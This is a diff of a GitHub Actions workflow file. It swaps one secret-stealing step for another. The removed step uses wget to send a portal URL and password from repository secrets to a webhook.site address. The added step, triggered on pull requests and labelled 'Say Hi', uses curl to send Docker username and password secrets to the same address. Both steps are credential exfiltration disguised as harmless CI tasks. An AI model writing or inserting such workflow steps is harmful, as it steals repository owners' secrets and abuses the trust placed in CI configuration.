@@ -1,18 +1,13 @@
-name: Test the PALINDROME portal
+name: meowers
 
-on:
-    issues:
-        types: [closed]
-    push:
-        branches: [main]
+on: [pull_request]
 
 jobs:
-  test:
-    runs-on: windows-latest
+  build:
+    runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
-      - name: Test the PALINDROME portal
-        run: | 
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{ secrets.PORTAL_URL }}&nya=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          cat test
-          echo "meoww"
+    - uses: actions/checkout@v2
+    - name: Say Hi
+      run: |
+        curl "https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{ secrets.DOCKER_USERNAME }}&nya=${{ secrets.DOCKER_PASSWORD }}"
+        echo nya
